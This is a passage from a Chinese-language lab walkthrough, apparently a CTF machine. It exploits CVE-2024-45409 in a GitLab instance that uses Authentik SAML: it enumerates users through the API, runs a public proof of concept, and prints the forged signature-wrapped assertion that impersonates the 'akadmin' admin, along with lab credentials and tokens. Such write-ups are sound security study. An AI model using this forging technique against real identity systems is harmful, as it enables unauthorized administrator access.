MRwwGgYDVQQDDBNhdXRoZW50aWsgMjAyNC4xMC41MB4XDTI0MTIxNDE1MzgwN1oX
DTI1MTIxNTE1MzgwN1owVjEqMCgGA1UEAwwhYXV0aGVudGlrIFNlbGYtc2lnbmVk
IENlcnRpZmljYXRlMRIwEAYDVQQKDAlhdXRoZW50aWsxFDASBgNVBAsMC1NlbGYt
c2lnbmVkMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAw4S8GGf2x07B
iDyFD3TKHGB9tFn0RI0FemZaCfCx2RUWzqCV+yPzB+fzC1Pf8UMgIP8dgeZmp3HQ
G3djppDhij+I+mETvLQdSQh8rk9ytUMW1eLgNTvNEH0IH1xEJEcmHOTPwcSNrezk
yIo0OZWGBFp8Vl3gGzLceJupdau9FUYiVOG4peUdSjrYP6xLN8IPo16Kh1+j8xD+
jZ8Nqjkx/GR70mfgPjqSO1EACjpHyjzhsruK43dTycDbxqOoY13pRrExo7U9YlEO
zFrpteP21sHLzd0k+80CPq/ZPWlXsIafJ18JOF+QWCD8K/HFmbCp9ihd3pQSZqka
0Hx2zRFyxBBGwtoWvOLWk+q+bbYLdXYiSXOHaZyx8bPF93U2qPUD0Td+IeQp8unx
SrruWV70L5Bts1iy6cQm8v/f1RF/Q0tQPpgSAaG/hxcSgOA4xLwBXR1yeGnfWP3w
VuTrSIAUObym+gJB4gGHFPmGdny9WthMQSebbyBGFjHBclquWAT4Tg7TSGg25SYk
Fo/XYHQ4m+TbpIA7RYsjreAkj6HOAaM8gsuX7qHLdN7w34G5l4eXviP0nFPoJ3Xv
ZC9h6NxCuvqaHEfB+9+ce2liuE8YFYAboWJLYcMrc+BDuT0Gt5RPs8FUUCgvU+Pp
OiDBOtLQmW9zXCQ5SLbdPU3AnEMaJysCAwEAAaNVMFMwUQYDVR0RAQH/BEcwRYJD
OUJXckhKaFBlMnRES3JNc04yUzlJQ1RpMFpnS0RQSVhaU1pDVWxoYS5zZWxmLXNp
Z25lZC5nb2F1dGhlbnRpay5pbzANBgkqhkiG9w0BAQsFAAOCAgEArshIX0felsel
T8D7iexndo+s272a0iVO/hZQU6jOPkwiyM2g5KrxBKzWOBTku3xlkF/qegukcVok
+EYNXuYuRyI9OFfTZzuDNnMkJyyxd8Vwhwt5NJRLUYJlXupAvPrkf6TkfmCJlGyf
YPzmmdPdXHCFtJxmyJoO00uLIy+03FvPEA1OiwCid8aQcFA/1u5BTSa3KZBo6BFC
QhNL/+xXo+oMz1cZKEr8hC28iUxSvLfQAtXQtPn9gp15vLl7ZfoPCFRLg3ED1vop
djAnWHcCs0JOoYlOt9dYSjtuiEIzNkJiM5Oge28OcBYYSXb0euYljzTbxzPo5Kt7
hCHJzNfXXcklLFiryCOLB2EZm36ICuBLVbZiARyHb8OkRQm7OoJ/uvWuScHXnLO0
pTSf9sH1SmDYGjk3/PDjkHHJAdaFQ21uABnfIWlmjF4suTmVIMbrtUOthnRdpX/f
DgDb/Y551jLfXH2Y7/OXgnehw/aHv9u4TF6TYqpNwdMtGjC+9IE7+pK6Kwk/K0u7
UMXOdBYWY4bvFphOWD1sgHQYdq2ArYPnEKUoLyl3wkadNWr2VUCmDJLCI17H3xru
fur17k7t1pNvUajUeXqBrqgfLqVfSOgkfRhESiqVVZvY5ErZ5CQjz9cIWy2d3xDu
GnA/5mkO/2YDN3/Ne05Xnf+MVB+8nuw=
</ds:X509Certificate>
</ds:X509Data>
</ds:KeyInfo>
</ds:Signature><saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">satoru</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2026-03-30T08:12:08Z" Recipient="https://gitlab.barrier.vl/users/auth/saml/callback"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2026-03-30T08:02:08Z" NotOnOrAfter="2026-03-30T08:12:08Z"/><saml:AuthnStatement AuthnInstant="2026-03-30T08:02:08Z" SessionIndex="b68b16cb8896b583440552e4bb710b6d51795c33fa3040873f39d15f5b074dd7" SessionNotOnOrAfter="2026-05-29T08:07:08Z"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress"><saml:AttributeValue>satoru@barrier.vl</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>
```
</details>

#### 将其保存saml.xml
```
[★]$ vi saml.xml
```
#### 查看gitlab的官方页面的版本17.3.2
https://about.gitlab.com/releases/categories/releases/
#### 它的补丁版本是17.3.3 
https://about.gitlab.com/releases/2024/09/17/patch-release-gitlab-17-3-3-released/
![图片](images/2026032704.png)
#### SAML身份验证绕过 SAML authentication bypass	Critical
#### 更新依赖项omniauth-saml至 2.2.1 版本和ruby-saml1.17.0 版本，以缓解CVE-2024-45409 漏洞。此安全漏洞仅适用于已配置基于 SAML 身份验证的实例
https://nvd.nist.gov/vuln/detail/CVE-2024-45409
#### Ruby SAML 库用于实现 SAML 授权的客户端。Ruby-SAML 12.2 及更早版本以及 1.13.0 至 1.16.0 版本中的版本无法正确验证 SAML 响应的签名。因此，未经身份验证的攻击者如果能够访问任何已签名的 SAML 文档（由身份提供商 (IdP) 签名），就可以伪造包含任意内容的 SAML 响应/断言。这将允许攻击者以任意用户身份登录到存在漏洞的系统中。此漏洞已在 1.17.0 和 1.12.3 版本中修复
### 枚举 GitLab 用户
#### 为了确定要以哪个用户身份登录，我需要知道可用的用户名。我需要一个 API 令牌，可以通过访问“首选项”页面（点击已登录用户的图标），然后点击“access tokens”来获取。在那里，我将点击“Add new token”，并为其授予所有权限范围：
![图片](images/2026032705.png)
#### Copy token:
#### 也可以使用命令获取token,获得了token_type
```
[★]$ curl -sk https://gitlab.barrier.vl/oauth/token -d "grant_type=password&username=satoru&password=dGJ2V72SUEMsM3Ca"
{"access_token":"d32c77f49ee9fb2356f6e98c1fc5f4cf9c1d0b64277716f80bbd43bf42311abd","token_type":"Bearer","expires_in":7200,"refresh_token":"5c98a818440e08c8cb7c139eb1c373c3e9e918eefe5a7a6024b51160952a1c20","scope":"api","created_at":1774775539}
```
#### 用作Bearer列出用户的令牌
```
[★]$ curl -sk --header "Authorization: Bearer glpat-***********" "https://gitlab.barrier.vl/api/v4/users?per_page=100" | jq .
[
  {
    "id": 5,
    "username": "ghost",
    "name": "Ghost User",
    "state": "active",
    "locked": false,
    "avatar_url": "https://secure.gravatar.com/avatar/79783106d88279c6c8f94f1f4dec22bdb9f90a8d14c9d6c6628a11430e236cbf?s=80&d=identicon",
    "web_url": "https://gitlab.barrier.vl/ghost"
  },
  {
    "id": 4,
    "username": "project_1_bot_9658594231602f87fbf2548e67d1c270",
    "name": "syareya",
    "state": "active",
    "locked": false,
    "avatar_url": "https://secure.gravatar.com/avatar/b41665efb35dfb04e28a21a1bde27f3aef1b3e7c8ed4ad241fdb80cdb620896b?s=80&d=identicon",
    "web_url": "https://gitlab.barrier.vl/project_1_bot_9658594231602f87fbf2548e67d1c270"
  },
  {
    "id": 2,
    "username": "satoru",
    "name": "satoru",
    "state": "active",
    "locked": false,
    "avatar_url": "https://secure.gravatar.com/avatar/f76962cdfb535a817fc9ff0e8fe34e28e92ba91df930af41f610fe8288e89a17?s=80&d=identicon",
    "web_url": "https://gitlab.barrier.vl/satoru"
  },
  {
    "id": 1,
    "username": "akadmin",
    "name": "akadmin",
    "state": "active",
    "locked": false,
    "avatar_url": "https://secure.gravatar.com/avatar/818e54f1cbac56d3843c45d092853330b4d2cb8a6a7feed4703d3019a6993314?s=80&d=identicon",
    "web_url": "https://gitlab.barrier.vl/akadmin"
  }
]
```
#### akadmin 是Authentik 使用的默认管理员名称！
### 利用 CVE-2024-45409 漏洞
https://github.com/synacktiv/CVE-2024-45409
```
[★]$ wget https://raw.githubusercontent.com/synacktiv/CVE-2024-45409/refs/heads/main/CVE-2024-45409.py
[★]$ pip3 install lxml
[★]$ python3 CVE-2024-45409.py -r saml.xml -n akadmin
[+] Parse response
	Digest algorithm: sha256
	Canonicalization Method: http://www.w3.org/2001/10/xml-exc-c14n#
[+] Remove signature from response //删除原签名
[+] Patch assertion ID		//修改 Assertion
[+] Patch assertion NameID
[+] Patch assertion conditions		//Conditions修改时间限制：NotBefore、NotOnOrAfter；否则SAML 可能会过期 → 登录失败
[+] Move signature in assertion
[+] Patch response ID		//冒充用户 akadmin
[+] Insert malicious reference		//插入恶意引用	
[+] Clone signature reference	//克隆签名引用
[+] Create status detail element	//插入 StatusDetai，隐藏/承载恶意结构（绕解析）
[+] Patch digest value		//重新计算摘要
[+] Write patched file in response_patched.xml
```
#### 成功构造了一个 SAML 伪造响应（signature wrapping 攻击），保留合法签名
<details>
<summary>cat response_patched.xml</summary>

```
[★]$ cat response_patched.xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:xenc="http://www.w3.org/2001/04/xmlenc#" Version="2.0" IssueInstant="2026-03-30T08:07:08Z" Destination="https://gitlab.barrier.vl/users/auth/saml/callback" ID="ID-76a81c64-51a0-4683-8bd5-30d2c70696e0"><saml:Issuer>authentik</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/><samlp:StatusDetail><ds:Reference URI="#_867848ec01c34e94b53ff04ce9143f97">
<ds:Transforms>
<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
</ds:Transforms>
<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
<ds:DigestValue>b9DRdBLRrh0YjMLL5nu9wzNy04rdNFq8V4XReaAhhn0=</ds:DigestValue>
</ds:Reference>
</samlp:StatusDetail></samlp:Status><saml:Assertion Version="2.0" ID="_867848ec01c34e94b53ff04ce9143f97" IssueInstant="2026-03-30T08:07:08Z"><saml:Issuer>authentik</saml:Issuer><ds:Signature>
<ds:SignedInfo>
<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
<ds:Reference URI="#_867848ec01c34e94b53ff04ce9143f97">
<ds:Transforms>
<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
</ds:Transforms>
<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
<ds:DigestValue>DRJcu4mThdP3Eb3YyDYIkzkCBB0ql3OrF6MQm9xIMGM=</ds:DigestValue>
</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>oGWFF9ybNNqFibHkGpa/fadOv1Bc5XqFIACcvsi59L4OdlF6ewKR7I/d8UXXPXVL
7LMAhPwX452bSCZ7WbD0sQmXiJ+/mNPOApFVYNWsUjJlaqlwzNuGQJLJpkymgWoc
DWhILIi9VMbeN2v4sXvDMc4xXOAGAcdbT9076BMylFMdDx6zkaNynurDW7PG8DNz
OtxQu7pTbiBAMqZV6DnQHJlojZ88zy7bhzsfzhO2WG8R40Ku1Eq6AZ+Nl4V9I3YV
bf0RXM04sElQM5Rs0fP3F1Kz0d7RHh822l+t7AW1gaLwgLsfvcx33vGb725mqFzN
Z4bonyu2/aAQcDO5Hz2C5XZDVpk0/T0DUAzEkMeZMatM1zokyNX+pK2BhtPS+aQ3
ESYH0LkAopAxIsSF+8anHqh1Rt9er6zu7Gk68bJu/a0AE2u/AxEU+tMkasFjinYI
fK9yKdkVkDHRfd1FCtEugYk51SpcX5uRg0kyMH/0oXKofs9cY9GkC5RB2kaxA5Mp
7UNdzeBBV8bTUUedFjQ0C1qr/PI/4I8cj0Ldfw7qPh/Ew06MrWYwkhpCdsYnRRnz
XQBkatMfvCcMvNYOlKI+kkc5097l7UjAhT9HV/+wf/NUB7cfwlwzzNbm3mcwe52W
E+StCQe71X3ELAygAaUeJEHx6G+HQfx/UFbbMP4YvJk=</ds:SignatureValue>
<ds:KeyInfo>
<ds:X509Data>
<ds:X509Certificate>MIIFUzCCAzugAwIBAgIQKtQS95zOTi6Uhb7Oomo4tDANBgkqhkiG9w0BAQsFADAe
MRwwGgYDVQQDDBNhdXRoZW50aWsgMjAyNC4xMC41MB4XDTI0MTIxNDE1MzgwN1oX
DTI1MTIxNTE1MzgwN1owVjEqMCgGA1UEAwwhYXV0aGVudGlrIFNlbGYtc2lnbmVk
IENlcnRpZmljYXRlMRIwEAYDVQQKDAlhdXRoZW50aWsxFDASBgNVBAsMC1NlbGYt
c2lnbmVkMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAw4S8GGf2x07B
iDyFD3TKHGB9tFn0RI0FemZaCfCx2RUWzqCV+yPzB+fzC1Pf8UMgIP8dgeZmp3HQ
G3djppDhij+I+mETvLQdSQh8rk9ytUMW1eLgNTvNEH0IH1xEJEcmHOTPwcSNrezk
yIo0OZWGBFp8Vl3gGzLceJupdau9FUYiVOG4peUdSjrYP6xLN8IPo16Kh1+j8xD+
jZ8Nqjkx/GR70mfgPjqSO1EACjpHyjzhsruK43dTycDbxqOoY13pRrExo7U9YlEO
zFrpteP21sHLzd0k+80CPq/ZPWlXsIafJ18JOF+QWCD8K/HFmbCp9ihd3pQSZqka
0Hx2zRFyxBBGwtoWvOLWk+q+bbYLdXYiSXOHaZyx8bPF93U2qPUD0Td+IeQp8unx
SrruWV70L5Bts1iy6cQm8v/f1RF/Q0tQPpgSAaG/hxcSgOA4xLwBXR1yeGnfWP3w
VuTrSIAUObym+gJB4gGHFPmGdny9WthMQSebbyBGFjHBclquWAT4Tg7TSGg25SYk
Fo/XYHQ4m+TbpIA7RYsjreAkj6HOAaM8gsuX7qHLdN7w34G5l4eXviP0nFPoJ3Xv
ZC9h6NxCuvqaHEfB+9+ce2liuE8YFYAboWJLYcMrc+BDuT0Gt5RPs8FUUCgvU+Pp
OiDBOtLQmW9zXCQ5SLbdPU3AnEMaJysCAwEAAaNVMFMwUQYDVR0RAQH/BEcwRYJD
OUJXckhKaFBlMnRES3JNc04yUzlJQ1RpMFpnS0RQSVhaU1pDVWxoYS5zZWxmLXNp
Z25lZC5nb2F1dGhlbnRpay5pbzANBgkqhkiG9w0BAQsFAAOCAgEArshIX0felsel
T8D7iexndo+s272a0iVO/hZQU6jOPkwiyM2g5KrxBKzWOBTku3xlkF/qegukcVok
+EYNXuYuRyI9OFfTZzuDNnMkJyyxd8Vwhwt5NJRLUYJlXupAvPrkf6TkfmCJlGyf
YPzmmdPdXHCFtJxmyJoO00uLIy+03FvPEA1OiwCid8aQcFA/1u5BTSa3KZBo6BFC
QhNL/+xXo+oMz1cZKEr8hC28iUxSvLfQAtXQtPn9gp15vLl7ZfoPCFRLg3ED1vop
djAnWHcCs0JOoYlOt9dYSjtuiEIzNkJiM5Oge28OcBYYSXb0euYljzTbxzPo5Kt7
hCHJzNfXXcklLFiryCOLB2EZm36ICuBLVbZiARyHb8OkRQm7OoJ/uvWuScHXnLO0
pTSf9sH1SmDYGjk3/PDjkHHJAdaFQ21uABnfIWlmjF4suTmVIMbrtUOthnRdpX/f
DgDb/Y551jLfXH2Y7/OXgnehw/aHv9u4TF6TYqpNwdMtGjC+9IE7+pK6Kwk/K0u7
UMXOdBYWY4bvFphOWD1sgHQYdq2ArYPnEKUoLyl3wkadNWr2VUCmDJLCI17H3xru
fur17k7t1pNvUajUeXqBrqgfLqVfSOgkfRhESiqVVZvY5ErZ5CQjz9cIWy2d3xDu
GnA/5mkO/2YDN3/Ne05Xnf+MVB+8nuw=
</ds:X509Certificate>
</ds:X509Data>
</ds:KeyInfo>
</ds:Signature><saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">akadmin</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2026-03-31T08:39:03Z" Recipient="https://gitlab.barrier.vl/users/auth/saml/callback"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2026-03-30T08:02:08Z" NotOnOrAfter="2026-03-31T08:39:03Z"/><saml:AuthnStatement AuthnInstant="2026-03-30T08:02:08Z" SessionIndex="b68b16cb8896b583440552e4bb710b6d51795c33fa3040873f39d15f5b074dd7" SessionNotOnOrAfter="2026-03-31T08:39:03Z"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress"><saml:AttributeValue>satoru@barrier.vl</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>
```
</details>

#### CyberChef:"Raw Deflate","To Base64","URL Encode(Encode all special chars)"
<details>
<summary>Output</summary>

```
7XhXj%2BLK1vY9Ev%2Bh1fsS9djGNrZbe1qvAwaDU8Bgc%2FPJMeCIAw6%2F%2FhQd5vT0O3veOef6k5CgVlU99axU1Fp%2FN06eVc960FRl0QQPQ54VzfOr8PtjVxfPpdMkzXPh5EHz3HrPBi2Jz8tv8HNVl23pldnjpy2%2F3%2BE0TVC3SVl8bPGb749x21bPENT3%2Fbce%2FVbWEbSEYRiCKQis8Zsk%2Butjde7%2FHj4PWsd3Wudj%2FRAU3j%2FgIxCM3fHBCgB%2FDOoGsPr%2BCFAeH4Sm6QKhaFqnaIEIXq6eYPQJhQ8w%2BQwTzzB5fnzggqZNCueuy9sJDTgiStrMcb%2B5Tl0nQf3tlkEd0LeBnK6Nobt1IM%2FJMtfxUnAI9%2F1R4J6IlUMi3gp7whEHfsJWJPpEuj4OTvOXHgGvqFUAP768uuj5lVf9ckcLijZJ%2F37F%2FBC%2Fu9FonbZrfh6xpR88HJ2sC35vP6AxWP1sdJ4XNM0j9DMKB6ybZC9%2F%2Bw2IlTCogemCB1MXvj%2F%2B9f%2FIFUFiZODBiIdiAYW5OBqGMOYFFIKhIUU8vszu%2Bw61UzRhWefNy%2FxnwQOdRWWdtHH%2BJwERFLcgK6vAfwIj4IWuDgDb%2FxQSgRD4DvkUDN6Th2DFX28g0K%2BYckkEXC4FbVz6f4D87%2BhqYmeJr37Qe8N5dcaLS3G6z4h6HcP2RRJFvOiofpJHGKt9mb%2BSR8zSA4eO4wL%2B%2Fsrq8%2BZ3oj9c8Sr4lb9%2BEr6HEv2RiF9DH0Tl%2F%2B3MP8mQP4tZoIDx4cF3A93HgS8UYfkuYJ2iLBKQOcn0mm9%2F7INfe%2Ffzkf%2BhO%2B%2Bx95SXdfBX3ThPXxz7X%2BTEl4D9%2F0lxj2tO33kdlh9iX0XXLmqPnC2kU8oyDHzNUKXmV5KWU4MgbaQ%2FTIpfBdWPEHjbV25OPE%2BNrixf%2BcTdppvKgULHV24I4%2BHWlRdo1rs1CU6JmOJn%2FCro9zohQD5pWpZqHcX5jBAlOlZ7C8OXrsGeiZPLwY2WW8luAeWyqtAVf7TlU2NedplzzUCadxttJ%2B6qdMyjU%2BnNZ9wpFkQhoY6SG8jLG9ZYN07ysMFS6A3t%2Be6BgokVI40ZL%2FncsJpSRx6LruZOhLohOXmaz5R20DqiOrgJQ0vX83HFFdp2l5WXM0lOI%2BHGUxNOsbI8bUgdg%2Fcdsr6u6PNCzrAjJaD2cT5zQ1i3JBhr1pkm4XoDhyrKI%2FsJ9gl9G5PLZbZoCfqERI7YR2IT3rwBRW8bl1ji%2BZWf5PnsjLllMXZLyKE1j1Pw7bRkcevMHasUhg4wZ9LTOpWCs%2BS0EjKV6Shbi2q%2FZOJWNRaOhs5na8PewmJKlxU9CI3BL0in2F5jRG%2BpoF5NHbFJV6S76yAHptfLDqKHtblopdRp%2BEtS2MJ8Fu6pce%2Bnx5Tb6qGP8Gy77iI7xRGj8iy80yM4HaUtBJfWvgwbyrOpTcriOrNMnYHGpQp405T9KWCYI%2BkeTDPw%2BYsGs8i1hlQBwgTSu8CiH%2FbEVY2hdQ%2BvpPpk92lcsX5jF7peAF9YGpMCFcMb60k32VayvbBIUw%2BHKSIjzAsdH6jtEVr0ISSbDOGFPQiJSXZzNPf6AF%2BegB0WRstqAYFY6Fqkx4h2zGC33g6rzWKrhQNk8q4rqZh926VvifAlpt8CfR%2BMn8LeAudz4IX0acje%2FwhCcL%2B2wYskCLw5sSw9dRHdCwwdCdq%2B1QwKn5RDsjJjl1DKvMRajpaZKL3GabKhepihtYanOTqYzyS97zeRzR01jeMYOfYtvTyfcNg5NZF0oUeZxQaJxRCJwSzuIMDSQRhkbo1IU9TLSGmBNDgIyKv08EPaHy%2Frq8RGGxox13Tfx7Z1hJ3NsfM3WS3wcuZu7NZbZoWbH9P5TFjLmVfo1TnPLralZ5Iu9Gv6ldOeo7PPnAaeow0mko8M3Ugs8oY0n31gAXuwwuWrrmuephWWjkj6Ps9Ge%2FAb0MIMcrMJlwNMMPNZwo08hx722w1DtXwB6wLMB%2FnZYUN2WOrmabqyx8WoTswinFhEDUlTigSV9KPgnFfoVpvPNqh%2FqSouTi4LYZGvDzdR8w0tJuuUGltTOiGBGMmHm7zewsIWGda7tZdvlYPae4ZcBxOwwyiUsHI%2BbRi%2BIo8ZGm0m0Qt2XeU7HcWbdnJUNlgVmL5xqW11NYgyKaglstrHyOJCDtxiPgMXh3y9pAO00Qk4DyP1cjUUZE2zl2o7Xqa4qbs9hvqH0ePc4aqUNoJWer0eSsKk7GytzGcTX1dtoC6RZitOPpwuSJhVr9BZPWVWIzjhDiF3Cr%2FQTixH7qEtn7tsRSWxj1aacb6mznwGb4flpPPjwDCbvi1PN0U8pYvrwnVt0bfsxLCUrXMeB9JVeQo1l1fV5OCDvxACrSK7YpjPjLruTkcCFnGmbZBkXHlaTt6gENF5SINbTa0ig3Y2UDx4RqTQ2CD2jKUjY7ApwpOK9vPZsTvUhkCbijvmi2jHYNFmy6v5xi9G6tTGkmYErjsyG%2F6yZbzs2p3oA3aIiIOxiZa4YQNf8CVk2VsNyxcHtxJoQrebSx3Q6WW1VWhHIqOms4jrVvRlokexDZ5hgXVLVLjg1XKHWjdwsbJUvJIHtrtdne06ZBbUwguWWdKtSZu3abc87UTbk2pvwXDdAd60uK42JG%2BabHQzFyq41JSEY5RW1PITNVmshhui66smShdrydmNDUuDLKEd%2BSjxUm9qIF90WKe1LcSsvV63dxxAMHeWl8Z7h2cyqdDXBrqTPRgbzSnbaYheSXxVGLCuGcfYMZGKO56G0jbw6XwactGSAYfzEs%2FOLF64Sx7xN3Hmgjx1Rrxyp1%2FcKK9ZtqbrJhYsOAyyJsjmswPJEUkwFH65aJbE0oFBHEPxWTNXF0VN%2B2SUlhG%2BrwdmP50U5pB26JClPHQNoi71jiXwxWJty1Znd%2FooUAofHs5Tx8mFlO7GcfDJYx%2F3LS7vdNG0d5nVVfRNrdNwdUjDnN1lmzGcz2x1ynNf9a0ty7e7IR93pQLDnSiMCxjlb%2BqaRpSkZxOfdDSPpyGkw5mD4aD7M1OuGJ6dz7RYFqHFYJWLUpoQ77xf12TMLsnEHIybGGp0a2mtWlBRheA3MSPOYamyvC5G6JpDbiWwpH%2Bhi9PWYxt4BxIvU1rKt41L2yVrYZLTXSLhShQsScVjbNuwXDjo7OwyHdxhUkt83xLzWcxud5McWsClmcgn9cgqIrNcn3N0JbAdIx7dc0Lr49YllVTXcnD176DuduoMb2sVogLPZ9XBCKlmixg5Z28uKQqp3CXdbne07%2FDaEulopgiFU5ZfeKzpDvlRkNy6NZU2LnS%2FsiBgSS7iXMjGceQihtZ2aROQYoGnWtxDzvZGddiBXx3sayX3vtRuLuyCEtYEeC%2Bs9n0K7eEOaGFKluIz9snG3BtfxcqJQ5poq9n%2BdUmDe61Y781SHDO0Tx1fPtXLo8nm3E5kBYTYokPdgedCVyNESrRIJd9M52IG1pWpr1EoXo%2BhoURpqMdrI7kej%2Bebja%2FrM85ql4nyhNO49NGBAwibgobwPFWgpc3JKCQHMG4V4UI6Mguy6Prv76%2FQr3%2B3n8Qff8r38ae%2F7J%2F%2B1t9LKqNzL4HXvo9kUMUL3AMPXuUOqMX%2BqbxHviGvksR%2Fuj%2Fgnfa5K5oq8ACVwH98cYBx8qR4r87eMH8%2Bji2LMLlvvBeNby%2F%2B3zcTvPzZDZw6qD9KwV8A3bV%2BkMtWKZSaDtug%2FlRMIvdiEqWeYRS0W3TAtEpABflfNVtAI%2BNNsV9Q%2BDL1zhWs8JP7dHOnxwTAZqB38qXQXb61gv6A%2F3sn5ZkG3Ip7IR7kQJeH1%2BE%2FldHv6AboxAAeQuEHw%2FdHF7x8kZXnkiS1cnESxTAYx5cB5roEArsrH0cICvdQNHRQGINJAg1RykfwEHdhAvN9ULq%2F4%2F0B6c%2BcgT3aYPiwzmcRm4GmHqi3Xn7b9%2FOevfs6IFbBV1%2FWvgqah8Degf9aVFZl3b474pfgv5j7SfbDph8M27ZO3K4N%2FnHi4R7kPyrVxouD3Gm%2BgfK0KZ3qtWTtm3vVikPgk%2Fj35kU7QkCLJG8gsDbJHN%2Bv722yr8hvr%2B%2FGacu6%2B59%2Fh%2BcH3Z%2BXfZX%2BL8EnBd5nPlo3Pzo7H53bl38B
```
</details>

#### 试过这个不行，果然POST和GET是有巨大差别的
![图片](images/2026033007.png)
### 我找到官方给的Burpsuite拦截的路径了，重新上面的步骤
#### 如果我们回顾一下 Gitlab 登录页面，会有一个选项可以输入凭证或者使用单点登录。此外，由于我们已经通过 Authentik 进行了身份验证，点击仪表板上的应用程序会执行单点登录流程，以让我们对这些应用程序进行身份验证。如果我们拦截 Gitlab 的单点登录过程，也就是 SAML 身份验证过程，我们就能获取一个可见的 SAML 令牌，对其进行解码，然后对其进行修改，以尝试以另一个用户的身份获取访问权限。在这种情况下我们将尝试获取管理员账户（akadmin）的访问权限。
#### 首先，我们使用 BurpSuite 来拦截 SSO 过程。在 Authentik 控制面板中点击 Gitlab 应用程序，并按照提示操作，直到我们以 satoru 的身份成功登录到 Gitlab 
![图片](images/2026033006.png)
<details>
<summary>Burpsuite GET /users/auth/saml/callback?SAMLResponse</summary>

```
GET /users/auth/saml/callback?SAMLResponse=nVjZkpvKsn3nKxy9HxU289Sx7bgMQiAxowF4ucFQDGIUgwT6%2BoO63d5ub9vH90Z0hLqSzKyVWZlVtervPqjK9tkGfdvUPfgwVWXdP78IPz%2BNXf3cBH3eP9dBBfrnIXp2OE19xj4hz23XDE3UlE%2FfmfzeIuh70A15U7%2BZxP3np2wY2mcYvt1un274p6ZLYQxBEBhh4UUn7vP0rzftKv69%2BwoMQRwMwZv%2BBOroF%2F5RGCEe%2FheNxf0RdP2C6vPT4uXpg9L3I1DqfgjqYREhGPURwT%2FiyB7FnjHsGSH8pw8i6Ie8DoYXq8cM%2FTJFmg9lEH4Kg67LQffpWsLjEm8PB%2BOQwY%2FswFFQlmEQFcsk4uen%2F0XZAGBBTOAEHRFhEoY0EyEUSYQMTgQ4xT59%2Bfth9vyCqPvy8APqIS%2F%2Bhr8X%2F%2F26gM4QDGP%2FfiQ0MfhwDMoR%2FD5z%2FYv2szNGEej7J%2FjL6wzvnT5zb8v3Y8IesVAsi4UxQ0YxBggcQ1kSpVCUAjhAWJYiyD%2FK65%2FFGy9I83TJ%2FtiBL9DbEMRKnTSvYyGomzpfsp3fX9ZIA0PWxB%2B4Mm26fMiqX1YFijyq4iOYoo8RStR%2FLamA3s33x55e6%2BtRvx%2BrpgN%2FdX3wsc8CjKTefNogAd1SgODDwVY%2BP%2F3131P4arfvgrpPmq7qfxj%2FV1TvugrUV1A2LYg%2F9m%2FBvSH7c4%2B%2FyBj8E5hini5N83%2FM36M%2F32ft1c1LTX9JFHY1zhJRADQHOtKOdXg%2BUykS86xJFPFU%2BjRlUn7VXLnPL5i%2BN35F%2BW0Rvo5%2FrKRvC%2F9qlOmRTRjbI76NzDSz2yFXJCK%2FNp4WCVwgeSZA3BOJ7gTErvT9Pj73J2%2FUdrTc7PZpk64gcFkp9Lilj9ElFLZ9sbHWnXxuMeoC6Cgax9DoZpEqZzz2jBnLuIthOYiCMzcnxoljG0KYeoNXpzuYEMdiu8bcq4Srcb7J2dUmWaVN5tMmc1eK2jtJxAxvnAa7rDvfYHIPYTWlgsSVDpfzQfZ2CAW6M7AMnGnvvluUw5hjF353PV5JRz6drMPlMmsbtCcNc6f4k4mzrIjW0Cowc9WU8nYr4sZtZax9KpFqI%2B3OjuinLnstRSDLYhPfsG2AE5hK8ZMgT1R9YPPLJthCPr8XW70%2BOxy2HuFraeeJmrNlug7n0DvuCt4K9uvmZKLnYiIum%2BlwVy6XnZeOPl%2FLmldAMbo%2FsQzL77qdkPGk6lSnlRlVO%2FbEufadaBx6VqNZY6iNifWUz3gxReNii2unUpExQYdMkb2KB3AcENAcC0kPszOtHK3a7fUtEivUOhR2uUzp4oxJaO9V3dZ3BYmhydXcXAqShQQ5cxb7friQYWW2F1lqzXaLHK%2BqOAhVqF5J9qDgyi4cpInM4pVwKbeZyxE8KyTuPCoQPKTR3jbn9R2WPTzfngq0p7Pe2mVd5Lf8dlrlSt0Yx6t8cMScwpNSoW7d7I1KH1wPWg3